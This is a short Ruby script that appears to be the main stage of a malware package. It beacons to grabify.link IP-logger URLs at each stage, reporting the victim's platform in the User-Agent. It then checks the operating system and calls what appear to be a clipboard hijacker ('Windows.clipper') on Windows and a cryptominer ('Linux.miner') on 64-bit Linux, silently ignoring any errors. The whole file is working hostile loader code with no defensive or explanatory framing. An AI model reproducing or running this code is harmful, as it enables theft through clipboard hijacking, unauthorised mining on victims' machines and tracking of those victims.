require_relative 'windows'
require_relative 'linux'
require 'open-uri'
require 'net/http'
require 'uri'
require 'resolv'
Version = 1
begin
html = open('http://grabify.link/VI9H2D', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-One-#{Version}", :allow_redirections => :safe).read
rescue
end
	os = RbConfig::CONFIG['host_os']
	if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
		Windows.clipper
		begin
			html = open('http://grabify.link/90A2ZI', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-Two-Windows-#{Version}", :allow_redirections => :safe).read
		rescue
		end
	elsif os.match("linux")
		output, status = Open3.capture2("uname -a ")
		if output.include?("64")
			Linux.miner
			begin
				html = open('http://grabify.link/4ZRRUX', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-Three-Linux-#{Version}", :allow_redirections => :safe).read
			rescue
			end
		end
	end